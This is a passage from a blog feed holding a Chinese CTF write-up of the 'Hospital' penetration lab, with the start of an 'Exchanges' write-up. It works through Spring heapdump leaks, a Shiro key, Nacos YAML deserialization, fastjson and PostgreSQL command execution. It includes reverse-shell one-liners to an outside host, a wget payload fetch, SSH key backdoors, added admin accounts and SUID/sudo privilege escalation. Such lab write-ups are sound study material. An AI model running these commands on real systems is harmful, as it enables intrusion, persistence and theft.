href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hospital</title>
      <link href="/2025/08/23/hospital/"/>
      <url>/2025/08/23/hospital/</url>
      
        <content type="html"><![CDATA[<p><a href="https://fushuling.com/index.php/2024/01/06/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83-hospital/">https://fushuling.com/index.php/2024/01/06/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83-hospital/</a></p><p><a href="https://www.s1mh0.cn/blog/index.php/2024/11/10/cqyj_hospital/">春秋云境-Hospital – S1mh0’s Blog</a></p><p><a href="https://blog.meteorkai.top/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/#flag3">春秋云镜-Hospital wp</a></p><h1 id="Hospital"><a href="#Hospital" class="headerlink" title="Hospital"></a>Hospital</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p>39.98.114.244</p><p><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a></p><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]└─$ ./fscan -h 39.98.114.244   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.98.114.244:8080 openOpen result.txt error, open result.txt: permission denied39.98.114.244:22 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 2start vulscan[*] WebTitle http://39.98.114.244:8080 code:302 len:0      title:None 跳转url: http://39.98.114.244:8080/login;jsessionid=77500958942AB18B45275A668911F721Open result.txt error, open result.txt: permission denied[*] WebTitle http://39.98.114.244:8080/login;jsessionid=77500958942AB18B45275A668911F721 code:200 len:2005   title:医疗管理后台Open result.txt error, open result.txt: permission denied[+] PocScan http://39.98.114.244:8080 poc-yaml-spring-actuator-heapdump-file (Spring Actuator 信息泄露漏洞（/heapdump 端点可下载 JVM 堆内存文件，可能包含敏感信息如账号密码、Session 等）。)Open result.txt error, open result.txt: permission denied                                                                                                               已完成 1/2 [-] ssh 39.98.114.244:22 root root@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.98.114.244:22 root a123456. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.98.114.244:22 root a123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.98.114.244:22 admin root ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.98.114.244:22 admin admin#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 1/2 [-] ssh 39.98.114.244:22 admin 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 2/2[*] 扫描结束,耗时: 7m4.627200175s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<a href="http://39.98.114.244:8080/actuator/heapdump%EF%BC%8C%E4%B8%8B%E8%BD%BDheapdump">http://39.98.114.244:8080/actuator/heapdump，下载heapdump</a></p><p>弱密码admin/admin123（但没有用)</p><p><a href="https://github.com/whwlsfb/JDumpSpider?tab=readme-ov-file">whwlsfb/JDumpSpider: HeapDump敏感信息提取工具</a></p><pre class="line-numbers language-none"><code class="language-none">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5e713f56389c93bb3f9fec2dd02f53cd.png"></p><p>拿到key<code>GAYysgMQhG7/CzIJlVpR2g==</code>(或者想翻shiro key，直接搜g==结尾的字符串)</p><pre class="line-numbers language-none"><code class="language-none">java -jar shiro_attack-4.7.0-SNAPSHOT-all.jarhttp://39.98.114.244:8080bash -i &gt;&amp; /dev/tcp/139.129.35.68/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTI5LjM1LjY4Lzc3NzcgMD4mMQ==bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMzkuMTI5LjM1LjY4Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6f1f2ea4159b096a0fea3017ef280dcc.png"></p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80wget http://139.129.35.68/linux_x64_agent./linux_x64_admin -c 39.98.114.244:7879 -s 123./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8f3a9b29f5ea2d12b8300401396d7306.png"></p><pre class="line-numbers language-none"><code class="language-none">vim.basic /root/flag/flag01.txt（通过 vim 的基础版本打开 /root/flag/flag01.txt 文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/62a37850da707f588f7a9578a5b130b0.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/vim.basic <span class="token parameter variable">-c</span> <span class="token string">':python3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec bash -p")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>-c ':python3 ...'</code>：<code>-c</code> 表示让 Vim 启动后直接执行后面的命令；<code>python3</code> 是 Vim 中调用 Python3 解释器的命令。</li><li><code>import os; os.execl(...)</code>：通过 Python 的 <code>os.execl</code> 函数替换当前进程（Vim 进程）为 <code>/bin/sh</code>，相当于直接启动一个 shell。</li><li><code>"sh"</code>：为新进程指定名称（通常与程序名一致）。</li><li><code>-p</code>：<code>sh</code> 的参数，表示 “特权模式”（preserve privileges），避免权限降级。</li><li><code>-c</code>：<code>sh</code> 的参数，用于执行后续字符串中的命令（即 <code>"reset; exec bash -p"</code>）。</li><li><code>"reset; exec bash -p"</code>：<code>reset</code> 清理终端显示；<code>exec bash -p</code> 替换当前 shell 为 bash，<code>-p</code> 确保保留特权模式（因 Vim 有 SUID 权限，此时 bash 会继承 root 权限）。</li></ul><pre class="line-numbers language-none"><code class="language-none">写公钥留后门了#自己的机器上ssh-keygen -t rsa -b 4096cat ~/.ssh/id_rsa.pub#弹的shellecho "~/.ssh/id_rsa.pub的内容" &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys#本地通过私钥登录目标主机ssh -i ~/.ssh/id_rsa root@39.99.140.174<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>目标主机的 <code>/root/.ssh</code> 目录必须是 <code>700</code> 权限（仅所有者可读写执行）</li><li><code>authorized_keys</code> 必须是 <code>600</code> 权限（仅所有者可读写）</li></ul></blockquote><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/fscan_all_version/fscan /tmp/1/fscan ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.30.12.5  netmask 255.255.0.0  broadcast 172.30.255.255./fscan -h 172.30.12.0/24download /tmp/1/result.txt /home/kali/result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ cat result.txt                                                                                                              172.30.12.6:8848 open172.30.12.6:445 open172.30.12.6:139 open172.30.12.236:8080 open172.30.12.6:135 open172.30.12.5:8080 open172.30.12.236:22 open172.30.12.5:22 open172.30.12.236:8009 open[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            [*] NetInfo [*]172.30.12.6   [-&gt;]Server02   [-&gt;]172.30.12.6[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=D6B3A2787153F87C17FA0FD90F59375B[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台[*] WebTitle http://172.30.12.5:8080/login;jsessionid=D6B3A2787153F87C17FA0FD90F59375B code:200 len:2005   title:医疗管理后台[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos [+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>目标 IP</th><th>开放端口</th><th>服务 / 应用信息</th><th>漏洞提示</th></tr></thead><tbody><tr><td>172.30.12.6</td><td>8848</td><td>HTTP 服务（404 Not Found）</td><td>存在 Alibaba Nacos 相关漏洞（未授权访问等） <code>poc-yaml-alibaba-nacos</code> <code>poc-yaml-alibaba-nacos-v1-auth-bypass</code></td></tr><tr><td></td><td>445、139</td><td>NetBIOS 服务</td><td>主机名：SERVER02 工作组：WORKGROUP</td></tr><tr><td></td><td>135</td><td>开放端口（可能为 RPC 服务）</td><td>-</td></tr><tr><td>172.30.12.236</td><td>8080</td><td>医院后台管理平台（HTTP 200）</td><td>-</td></tr><tr><td></td><td>22</td><td>SSH 服务</td><td>-</td></tr><tr><td></td><td>8009</td><td>开放端口（可能为 AJP 协议，常用于 Tomcat）</td><td>-</td></tr><tr><td>172.30.12.5</td><td>8080</td><td>医疗管理后台（HTTP 302 跳转至登录页）</td><td>存在 Spring Actuator 堆内存泄露漏洞 <code>poc-yaml-spring-actuator-heapdump-file</code></td></tr><tr><td></td><td>22</td><td>SSH 服务</td><td>-</td></tr></tbody></table><p><a href="https://blog.csdn.net/m0_73353130/article/details/131786333">Alibaba Nacos权限认证绕过漏洞复现_nacos未授权访问漏洞修复-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">./windows_x64_admin.exe -c 39.98.114.244:7876 -s 123./linux_x64_agent -l 7876 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>172.30.12.6:8848/nacos</p><p>弱口令进入后台 <code>nacos:nacos</code>，获取到的配置文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">server:  port: 8080  servlet:    context-path: /hellospring:  application:    name: db-config  cloud:    nacos:      discovery:        server-addr: 127.0.0.1:8848      config:        server-addr: 127.0.0.1:8848        file-extension: yaml        namespace: dev        group: DEFAULT_GROUP        data-id: db-config.yaml  datasource:    mysql:      url: jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true      username: root      password: P@ssWord!!!  redis:    host: localhost    port: 6379management:  endpoints:    web:      exposure:        include: '*'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/charonlight/NacosExploitGUI/releases/tag/v7.0">Release NacosExploitGUI_v4.0 · charonlight/NacosExploitGUI</a></p><pre class="line-numbers language-none"><code class="language-none">java -jar NacosExploitGUI_v4.0.jarhttp://172.30.12.6:8848/nacos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4acca1d45b35339131cbc661a47c01df.png"></p><p>原来的是弹计算器的</p><pre class="line-numbers language-none"><code class="language-none">Runtime.getRuntime().exec("net user qaq qaq1234! /add");Runtime.getRuntime().exec("net localgroup administrators qaq /add");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3e01c5efed43b8593ac868637c4e1547.png"></p><p>然后改完后再保存再打为jar包</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/daa2f2925376535bb19a3ef1b345e66c.png"></p><pre class="line-numbers language-none"><code class="language-none">javac src/artsploit/AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/ma/yaml-payload.jar /tmp/1/yaml-payload.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http://172.30.12.6:8848/nacoshttp://172.30.12.5:54321/yaml-payload.jardb-config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3456e7f574e2d7caacf9864031be928e.png"></p><p>进入交互式shell</p><pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty; pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>python3 -c</code>：通过 Python3 执行后续字符串中的代码（<code>-c</code> 表示执行命令行字符串）</li><li><code>import pty</code>：导入 Python 的 <code>pty</code> 模块（伪终端处理模块，用于创建模拟终端环境）</li><li><code>pty.spawn("/bin/bash")</code>：调用 <code>pty</code> 模块的 <code>spawn</code> 函数，启动一个 <code>/bin/bash</code> 进程，并将其与伪终端关联</li></ul></blockquote><p>再<code>python3 -m http.server 54320</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b0a6c02aa9bb69d5f1290517808c69b7.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains rdesktop 172.30.12.6 -u qaqwww -p 'qaq@1234'proxychains4 xfreerdp /u:qaqwww /p:'qaq@1234' /v:172.30.12.6（我试试不行，让学长给我创了个号）proxychains4 crackmapexec smb 172.30.12.6 -u 'qaqwww' -p 'qaq@1234'qaqwww/qaq@1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注意密码要符合标准，不然可能会出现些情况。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/703ecd980873e16b3ebc5c77de0304b3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c8966aa440e55b469ab32de6eb0ece95.png"></p><hr><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>发现web2只有一个网口</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b91224f2683112ca2c9e199131a3ab1f.png"></p><p>用burp内置浏览器打开172.30.12.236:8080</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/71724234ce2f6c358aba06a8b2894b72.png"></p><p><a href="https://github.com/amaz1ngday/fastjson-exp">amaz1ngday/fastjson-exp: fastjson利用，支持tomcat、spring回显，哥斯拉内存马；回显利用链为dhcp、ibatis、c3p0。</a></p><blockquote><ul><li><p>目标应用开启了 session 持久化（可能是把 session 存数据库或者文件里），这样 session 会跨请求保持状态。</p></li><li><p>你在 session 里存入的数据，<strong>因为不能被反序列化</strong>，所以后续请求时就读取不到原来的对象，导致 session 损坏或者无法使用。</p></li><li><p>换句话说，你的 shell 尝试依赖 session 来存储信息，但是 session 已经坏掉了，所以后续的 shell 操作无法进行。</p></li><li><p>这就是上一条的结果：shell 初始化失败，无法继续操作。</p></li><li><p>意思是，不要把数据存在 session 中，而是直接存到 application 级别（全局对象），这样就不会被序列化和反序列化影响了。</p></li></ul></blockquote><p>尝试写入公钥，首先本地用<code>ssh-keygen</code>生成公钥和私钥，将公钥后的<code>用户名@主机名</code>部分删掉，接着尝试在哥斯拉使用echo直接将公钥写到authorized_keys，但是应该是由于长度过长导致命令执行失败，所以最后还是通过在web1上传公钥并开启http服务，在哥斯拉（fastjson命令执行getshell，这次使用插件的inject直接注入哥斯拉内存马）通过wget下载，之后写入到authorized_keys</p><p>我是被人捞的<br>二级代理是得主动连。在stowawy上</p><pre class="line-numbers language-none"><code class="language-none">listenuse 0listen144446<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在目标机上<code>./linux_x64_agent -c 172.30.12.5:44446 -s 123 --reconnect 8</code>即可</p><p>然后</p><pre class="line-numbers language-none"><code class="language-none">backuse 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就能到web3了</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/256eb5bd263067bc029da5a94ab346ee.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2d263a4a148a59b3c7056426885934b3.png"></p><hr><h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>发现是双网卡</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/350e33afc99ae0a34335b55cd36aeb67.png"></p><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/fscan_all_version/fscan /1/fscan inet 172.30.54.179  netmask 255.255.255.0  broadcast 172.30.54.255./fscan -h 172.30.54.1/24download /1/result.txt /home/kali/result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现172.30.54.12，上面有grafana服务</p><pre class="line-numbers language-none"><code class="language-none">cat result.txt172.30.54.12:3000 open172.30.54.12:22 open172.30.54.179:22 open172.30.54.179:8009 open172.30.54.179:8080 open172.30.54.12:5432 open[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/A-D-Team/grafanaExp/releases/tag/v1.5">Release v1.5 · A-D-Team/grafanaExp</a></p><pre class="line-numbers language-none"><code class="language-none">./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但需要v1.1的版本才能扫到postgres数据库账密，github上已经没有该版本了。Postgres@123（应该爆出来的密码）</p><pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.98.114.244:7876 -s 123./linux_x64_agent -l 7876 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>建立多重代理：还是一样<code>listen</code> 、<code>1 </code>、 <code>11121</code>。</p><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/Stotaway-bin/linux_x64_agent /1/linux_x64_agent#把受控端传到web3上，发起对web1的连接./linux_x64_agent -c 172.30.12.5:11121 -s 123 --reconnect 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>之后再开个socks5</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bd1531b8e113031358e0dfcaebf21620.png"></p><p>把proxychains4.conf里的也换了</p><pre class="line-numbers language-none"><code class="language-none">vim /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong><code>psql</code></strong></p><ul><li>PostgreSQL 的命令行客户端。</li></ul><p><strong><code>-h 172.30.54.12</code></strong></p><ul><li>指定 PostgreSQL 服务器的 IP 地址。</li></ul><p><strong><code>-U postgres</code></strong></p><ul><li>指定用户名，这里是 <code>postgres</code>。</li></ul><p><strong><code>-W</code></strong></p><ul><li>强制提示输入密码。、</li></ul></blockquote><blockquote><p><strong><code>ALTER USER root</code></strong></p><ul><li>指定要修改的数据库用户是 <code>root</code>。</li></ul><p><strong><code>WITH PASSWORD '123456'</code></strong></p><ul><li>将该用户的密码修改为 <code>123456</code>。</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">proxychains4 -q psql -h 172.30.54.12 -U postgres -WPostgres@123（应该爆出来的密码）ALTER USER root WITH PASSWORD '123456';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a029d78a18c32310ce18195e03e1791c.png"></p><pre class="line-numbers language-none"><code class="language-none">select system('whoami');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>PostgreSQL &lt;= 8.1</code> 可以通过调用系统的动态链接库 <code>libc.so.6</code> 来实现命令执行</p><pre class="line-numbers language-none"><code class="language-none">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICTOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong><code>CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer</code></strong></p><ul><li>创建一个叫 <code>system</code> 的函数，接收一个 <code>cstring</code>（C 字符串）类型参数，返回一个整数。</li><li>返回值是 <code>system()</code> 的返回值（通常 0 表示成功，非 0 表示错误）。</li></ul><p><strong><code>AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'</code></strong></p><ul><li>告诉 PostgreSQL 去调用 libc 动态库里的 <code>system</code> 函数。</li><li>相当于把系统调用暴露到数据库里。</li></ul><p><strong><code>LANGUAGE 'c'</code></strong></p><ul><li>指定这是一个 C 语言函数，而不是 SQL 或 PL/pgSQL。</li></ul><p><strong><code>STRICT</code></strong></p><ul><li>如果传入参数是 NULL，函数不会执行，直接返回 NULL。</li></ul></blockquote><p>创建函数成功后，执行命令时当返回值为 <code>0</code> 表示执行成功，其它值则是执行失败。我们使用 <code>perl</code> 反弹 shell，注意在 <code>Web03</code> 机器上监听端口</p><pre class="line-numbers language-none"><code class="language-none">select system('perl -e \'use Socket;$i="172.30.54.179";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};\'');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="SQL-部分"><a href="#SQL-部分" class="headerlink" title="SQL 部分"></a>SQL 部分</h3><pre class="line-numbers language-none"><code class="language-none">SELECT system('perl -e \' ... \';');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>system()</code> 是你之前创建的 C 函数，它会调用操作系统命令。</li><li>参数是一个复杂的 <strong>Perl 单行脚本</strong>。</li></ul><h3 id="Perl-脚本"><a href="#Perl-脚本" class="headerlink" title="Perl 脚本"></a>Perl 脚本</h3><pre class="line-numbers language-none"><code class="language-none">use Socket;$i = "172.30.54.179";   # 攻击者 IP$p = 1234;               # 攻击者监听端口socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(S, sockaddr_in($p, inet_aton($i)))) {    open(STDIN, "&gt;&amp;S");    open(STDOUT, "&gt;&amp;S");    open(STDERR, "&gt;&amp;S");    exec("/bin/sh -i");};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong><code>use Socket;</code></strong><ul><li>加载 Perl 套接字库。</li></ul></li><li><strong><code>socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));</code></strong><ul><li>创建一个 TCP 套接字。</li></ul></li><li><strong><code>connect(S, sockaddr_in($p, inet_aton($i)))</code></strong><ul><li>尝试连接到攻击者机器的 IP:PORT。</li></ul></li><li><strong><code>open(STDIN, "&gt;&amp;S"); ...</code></strong><ul><li>把标准输入/输出/错误重定向到这个 TCP 连接上。</li></ul></li><li><strong><code>exec("/bin/sh -i");</code></strong><ul><li>启动交互式 shell，让攻击者能远程执行命令。</li></ul></li></ol></blockquote><p>在web3上<code>nc -lvnp 1234</code></p><p>执行后成功弹回shell</p><p>先获取一个交互式 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>sudo -l</code>发现可以psql提权</p><p>执行</p><pre class="line-numbers language-none"><code class="language-none">sudo /usr/local/postgresql/bin/psql（提权）password:123456 # 前面已经修改为123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注意利用 <code>psql</code> 需要为绝对路径，否则需要 <code>Linux</code> 用户 <code>postgres</code> 的密码，其次需要 <code>PostgreSQL</code> 数据库中 <code>root</code> 用户的密码，不过前面我们修改过了。<code>root</code>用户的密码为<code>123456</code></p></blockquote><p><a href="https://gtfobins.github.io/gtfobins/psql/">psql | GTFOBins</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2b87453e6e371429adf7a8af7b42d9bc.png"></p><pre class="line-numbers language-none"><code class="language-none">root=# \?Input/Output!/bin/bashroot@web04:/usr/local/pgsql/data# whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">\?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这是 <code>psql</code> 的内置帮助命令，用来列出所有 <code>psql</code> 的 meta 命令（<code>\</code> 开头的那些）。</li></ul><pre class="line-numbers language-none"><code class="language-none">!/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是 psql 的 外壳逃逸功能。</p><p>在 psql 中输入 ! 后跟命令，会直接调用系统 shell。</p><p>你执行的是 !/bin/bash，所以直接进入了服务器的 bash shell。</p></blockquote><p>进入后就ok了</p><p>最后<code>cat /root/flag/flag04.txt</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/97b180c5c48774a6010b83652f593b8b.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchanges</title>
      <link href="/2025/08/17/exchanges/"/>
      <url>/2025/08/17/exchanges/</url>
      
        <content type="html"><![CDATA[<h1 id="Exchanges"><a href="#Exchanges" class="headerlink" title="Exchanges"></a>Exchanges</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p>扫一下</p><pre class="line-numbers language-none"><code class="language-none">──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]└─$ ./fscan -h 39.98.109.189   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.98.109.189:22 openOpen result.txt error, open result.txt: permission denied39.98.109.189:80 openOpen result.txt error, open result.txt: permission denied39.98.109.189:8000 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 3start vulscan[*] WebTitle http://39.98.109.189       code:200 len:19813  title:lumiaOpen result.txt error, open result.txt: permission denied[*] WebTitle http://39.98.109.189:8000  code:302 len:0      title:None 跳转url: http://39.98.109.189:8000/login.htmlOpen result.txt error, open result.txt: permission denied[*] WebTitle http://39.98.109.189:8000/login.html code:200 len:5662   title:Lumia ERPOpen result.txt error, open result.txt: permission denied已完成 3/3[*] 扫描结束,耗时: 43.650148792s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现了华夏ERP开在了8000端口<br><a href="https://cn-sec.com/archives/1798444.html">华夏erp账号密码泄露+后台rce（最新组合漏洞)</a></p><p><a href="http://39.98.109.189:8000/user/getAllList;.ico">39.98.109.189:8000/user/getAllList;.ico</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4a8ded950e8d4cf2314035280b318897.png"></p><p><img 